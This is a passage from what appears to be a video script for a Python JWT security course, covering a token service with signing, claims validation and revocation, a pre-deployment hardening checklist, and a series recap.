                if not token_scopes.issuperset(required_scopes):
                    return {"error": "insufficient scope"}, 403

            g.current_user = payload["sub"]
            return f(*args, **kwargs)
        return wrapper
    return decorator

@app.route("/api/orders", methods=["POST"])
@require_auth(required_scopes={"orders:write"})
def create_order():
    user_id = g.current_user
    ...
```

---

### SCENE 2: Production JWT Service (4:00 - 10:00)

**[VISUAL: Code editor — `SecureJWTService` class]**

**NARRATOR:**
"Let me show you a production-ready JWT service that integrates everything we've covered."

**[VISUAL: Walk through the SecureJWTService class, highlighting each security feature]**

"RSA-256 signing with separate keys. All claims required and validated. Token type checking — access tokens can't be used as refresh tokens. Deny-list integration with Redis. User-level revocation for password changes. Comprehensive logging for security monitoring."

**[VISUAL: Show the class in action]**

```python
service = SecureJWTService({
    "issuer": "auth.myapp.com",
    "audience": "api.myapp.com",
    "private_key_path": "/etc/keys/private.pem",
    "public_key_path": "/etc/keys/public.pem",
    "revocation_store": RedisRevocationStore(),
})

# Issue
token = service.issue_access_token("user123", roles=["viewer"], scopes=["read"])

# Verify (checks signature, claims, deny-list, user revocation)
payload = service.verify_access_token(token)

# Revoke on logout
service.revoke_token(payload["jti"])

# Revoke all on password change
service.revoke_all_user_tokens("user123")
```

---

### SCENE 3: The Complete Checklist (10:00 - 12:30)

**[VISUAL: Animated checklist — each item checks off as discussed]**

**NARRATOR:**
"Before you deploy any JWT implementation, run through this checklist."

"Algorithm safety: explicit allowlist, single algorithm type, never from the token header."

"Secret management: 256-bit minimum for HMAC, RSA-2048 or ECDSA P-256 for asymmetric, never hardcoded."

"Claims validation: exp with reasonable TTL, aud per service, iss from known issuers, jti for revocation."

"Token lifecycle: short-lived access, refresh rotation, deny-list, revoke on password change."

"Storage: HttpOnly cookies for web, never localStorage, never in URLs."

"Header safety: reject jwk/jku, validate kid against allowlist."

---

### SCENE 4: Series Wrap-Up (12:30 - 14:00)

**[VISUAL: Series recap with all 8 episode titles]**

**NARRATOR:**
"That's the complete JWT security journey for Python developers. From understanding the three-part structure, through the critical attacks — alg:none, weak secrets, algorithm confusion, header injection — to building production-ready token lifecycles with proper revocation."

"The single most important takeaway: the algorithms parameter is your first line of defense. Get that right and you prevent most JWT attacks. Get claims validation right and you prevent the rest."

"If you want to test your knowledge, take the Level 1, 2, or 3 assessments. Good luck building secure authentication."

**[VISUAL: End card with assessment links and Verifhai branding]**

---

**Series Version:** 1.0
**Framework:** HAIAMM v2.0
**Practice:** Education & Guidance (EG)
**Module:** EG-LAB-JWT-001
**Author:** Verifhai
